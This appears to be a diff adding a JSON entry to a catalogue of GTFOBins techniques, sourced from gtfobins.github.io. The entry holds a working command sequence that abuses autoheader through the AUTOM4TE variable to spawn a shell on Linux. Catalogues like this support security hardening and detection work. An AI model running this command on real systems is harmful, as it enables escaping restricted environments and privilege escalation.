@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-autoheader-shell",
+  "name": "GTFOBins · autoheader (shell)",
+  "command": "echo '/bin/sh 1>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\ntouch configure.ac\nAUTOM4TE=/path/to/temp-file autoheader",
+  "description": "Use autoheader to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "autoheader",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/autoheader/#shell",
+  "upstream_id": "autoheader/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/autoheader/"
+    }
+  ]
+}
